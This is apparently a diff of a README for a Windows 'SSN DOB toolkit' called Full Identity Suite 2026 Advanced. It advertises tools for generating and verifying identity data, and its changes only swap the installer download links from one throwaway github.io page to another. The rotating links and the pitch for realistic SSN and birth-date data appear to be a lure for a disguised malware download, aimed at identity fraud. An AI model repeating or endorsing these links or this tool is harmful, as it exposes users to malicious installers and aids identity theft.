@@ -2,7 +2,7 @@
 
 Full Identity Suite 2026 Advanced is a powerful and comprehensive Windows desktop application designed for advanced identity information management. This complete SSN DOB toolkit provides a robust set of tools for generating, checking, and verifying identity data in a secure, offline environment. Whether you need to create realistic test data for software development or verify information formats, this suite offers a private and powerful solution.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -53,7 +53,7 @@ Installing Full Identity Suite 2026 Advanced is a straightforward process. Pleas
 
 To get the latest version of Full Identity Suite 2026 Advanced, please visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *© 2026 Full Identity Tools. All rights reserved. This software is for authorized use only.*
